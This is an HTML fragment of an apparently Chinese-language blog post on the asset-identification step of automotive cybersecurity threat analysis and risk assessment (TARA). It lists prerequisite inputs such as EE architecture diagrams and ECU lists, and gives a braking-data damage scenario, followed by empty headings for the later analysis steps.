<li>从威胁情景中获得资产；   主要是依靠安全模型，或者是从事安全工作者自身的经验。标准给出了四个模型：EVITA[20], TVRA[21], PASTA[22], STRIDE</li>
</ul>
<blockquote>
<p>损坏场景是车辆高速行驶时，刹车完全制动与后续车辆碰撞（追尾碰撞）；该资产是制动功能的数据通信，其网络安全属性是完整性；</p>
</blockquote>
<ul>
<li>使用预定义的分类；</li>
</ul>
<h3 id="前置条件">前置条件</h3>
<p><strong>必要条件</strong></p>
<ol>
<li>车辆与外部接口信息；可能需要到现在与客户一起梳理。</li>
<li>EE架构图：<br>
ECU之间的通信链路设计方案（通信方式、通信协议等）；<br>
通信链路上的安全设计方案（若有）；</li>
<li>ECU清单及详细名称，包括简称和全称；</li>
<li>整车功能清单，内容包括功能定义、功能详细描述，以及每一个功能关联到的ECU；</li>
</ol>
<p><strong>如有可以附加的条件</strong><br>
5. 与信息安全相关连的关键业务（或功能）的功能场景描述文档，如蓝牙钥匙功能规范；<br>
6. 历史安全事件记录；<br>
7. 安全事件处置策略；</p>
<blockquote>
<p>数据流图：提供关于架构设计的硬件和软件组件及其接口规范的详细概述；提供有关正在开发的组件的操作环境的信息；以及详细的硬件、软件和操作要求；</p>
</blockquote>
<h3 id="不同的阶段">不同的阶段</h3>
<p>由于TARA威胁分析进入开发阶段的时间各有不同，在开发完成的中后期，整车的架构清晰、边界明确、功能定义完善，可以将每个信息传输实例作、范围内/外边界的每个信息传输实例、每个信息生成信息的实例、每一个信息转换实例均作为资产；如果是在开发的前期，可以将每个物理模块、每个数据等作为资产。</p>
<h3 id="资产识别的结果">资产识别的结果</h3>
<p>在资产识别阶段需要完成对资产的梳理，识别资产具有的信息安全属性，确定损害场景，并对损害场景进行影响评级（SFOP） 参考：<strong>Annex F 中的 Table F.1——Table F.4</strong></p>
<p>其中对于信息安全属性的赋值和损害场景的设定需要具有一定专业能力的信息安全从业者参与过程。</p>
<h2 id="二-威胁场景分析">二、威胁场景分析</h2>
<h2 id="三-威胁等级划分">三、威胁等级划分</h2>
<h2 id="四-攻击路径分析">四、攻击路径分析</h2>
<h2 id="五-攻击可行性等级划分">五、攻击可行性等级划分</h2>
<h2 id="六-风险值确定">六、风险值确定</h2>
<h2 id="七-风险处置决策">七、风险处置决策</h2>
]]></content>
    </entry>
</feed>